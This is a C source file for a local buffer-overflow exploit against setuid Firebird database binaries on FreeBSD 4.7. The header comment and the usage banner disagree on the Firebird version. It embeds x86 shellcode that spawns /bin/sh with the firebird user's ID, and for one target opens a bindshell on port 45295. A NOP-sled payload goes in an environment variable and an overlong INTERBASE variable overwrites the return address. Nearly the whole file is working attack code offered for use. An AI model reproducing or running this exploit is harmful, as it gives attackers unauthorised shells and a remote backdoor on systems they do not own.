/* DSR-olbird.c by bob@dtors.net
   -------------------------------

Same exploit as DSR-firebird.c apart from this version
exploits Firebird 1.0.0 which is shipped with freebsd.

[diif] ret addr && LEN [/diif]

bob@dtors.net
*/


#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#define LOCK    "/usr/local/firebird/bin/gds_lock_mgr"
#define DROP    "/usr/local/firebird/bin/gds_drop"
#define INET    "/usr/local/firebird/bin/gds_inet_server"
#define LEN     1032

char dropcode[]=
        "\x31\xc0\x50\x6a\x5a\x53\xb0\x17\xcd\x80" 
        "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f"
	  "\x62\x69\x6e\x89\xe3\x50\x54\x53\x50\xb0"
	  "\x3b\xcd\x80\x31\xc0\xb0\x01\xcd\x80"; 

char inetcode[]=
        "\x31\xc0\x50\x6a\x5a\x53\xb0\x17\xcd\x80" 
        "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f"
	  "\x62\x69\x6e\x89\xe3\x50\x54\x53\x50\xb0"
	  "\x3b\xcd\x80\x31\xc0\xb0\x01\xcd\x80"; 

                            

char lockcode[]= 
	"\x31\xc0\x31\xdb\xb0\x02\xcd\x80"
	"\x39\xc3\x75\x06\x31\xc0\xb0\x01\xcd\x80"
	"\x31\xc0\x50\x6a\x5a\x53\xb0\x17\xcd\x80" //setuid[firebird] by bob
	"\x31\xc0\x31\xdb\x53\xb3\x06\x53" //fork() bindshell by eSDee
	"\xb3\x01\x53\xb3\x02\x53\x54\xb0"
	"\x61\xcd\x80\x89\xc7\x31\xc0\x50"
	"\x50\x50\x66\x68\xb0\xef\xb7\x02"
      "\x66\x53\x89\xe1\x31\xdb\xb3\x10"
      "\x53\x51\x57\x50\xb0\x68\xcd\x80"
      "\x31\xdb\x39\xc3\x74\x06\x31\xc0"
      "\xb0\x01\xcd\x80\x31\xc0\x50\x57"
      "\x50\xb0\x6a\xcd\x80\x31\xc0\x31"
      "\xdb\x50\x89\xe1\xb3\x01\x53\x89"
      "\xe2\x50\x51\x52\xb3\x14\x53\x50"
      "\xb0\x2e\xcd\x80\x31\xc0\x50\x50"
      "\x57\x50\xb0\x1e\xcd\x80\x89\xc6"
      "\x31\xc0\x31\xdb\xb0\x02\xcd\x80"
      "\x39\xc3\x75\x44\x31\xc0\x57\x50"
      "\xb0\x06\xcd\x80\x31\xc0\x50\x56"
      "\x50\xb0\x5a\xcd\x80\x31\xc0\x31"
      "\xdb\x43\x53\x56\x50\xb0\x5a\xcd"
      "\x80\x31\xc0\x43\x53\x56\x50\xb0"
      "\x5a\xcd\x80\x31\xc0\x50\x68\x2f"
      "\x2f\x73\x68\x68\x2f\x62\x69\x6e"
      "\x89\xe3\x50\x54\x53\x50\xb0\x3b"
      "\xcd\x80\x31\xc0\xb0\x01\xcd\x80"
      "\x31\xc0\x56\x50\xb0\x06\xcd\x80"
      "\xeb\x9a";

char *decide(char *string)
{
    if(!(strcmp(string, "1")))
      return((char *)&inetcode);
    if(!(strcmp(string, "2")))
      return((char *)&lockcode);
    if(!(strcmp(string, "3")))
      return((char *)&dropcode);
    exit(0);
}

int main(int argc, char **argv)
{
	
	unsigned long ret = 0xbfbff75d;
	  
	char *selectcode;
	char buffer[LEN];
	char egg[1024];
	char *ptr;
	int i=0;

  

	if(argc < 2)
	{
		printf("( ( Firebird-1.0.2 Local exploit for Freebsd 4.7 ) )\n"); 
		printf("( (                           by - bob@dtors.net ) )\n");
		printf("----------------------------------------------------\n\n");
		printf("Usage: %s <target#> \n", argv[0]);
		printf("Targets:\n");
		printf("1. [0xbfbff75c] - gds_inet_server\n");
		printf("2. [0xbfbff75d] - gds_lock_mgr\n");
		printf("3. [0xbfbff75e] - gds_drop\n");
		printf("\nwww.dtors.net\n");
		exit(0);
	}
  
	selectcode = (char *)decide(argv[1]);
  	memset(buffer, 0x41, sizeof(buffer));

        ptr = egg;

        for (i = 0; i < 1024 - strlen(selectcode) -1; i++) *(ptr++) = 0x90;
        for (i = 0; i < strlen(selectcode); i++) *(ptr++) = selectcode[i];
        egg[1024 - 1] = '\0';

        memcpy(egg,"EGG=",4);
        putenv(egg);

        memcpy(&buffer[1028],(char *)&ret,4);
        buffer[1032] = 0;

        setenv("INTERBASE", buffer, 1);

        fprintf(stdout, "Return Address: 0x%x\n", ret);
        fprintf(stdout, "Buffer Size: %d\n", LEN);
        fprintf(stdout, "Setuid [90]\n");

if(selectcode == (char *)&inetcode)
  {
	execl(INET, INET, NULL);
	return 0;
   }

if(selectcode == (char *)&lockcode)
  {
 	printf("\nShell is on port 45295\nExploit will hang!\n");
	execl(LOCK, LOCK, NULL);
	return 0;
   }

if(selectcode == (char *)&dropcode)
  {
	execl(DROP, DROP, NULL);
	return 0;
   }

	
	return 0;
}
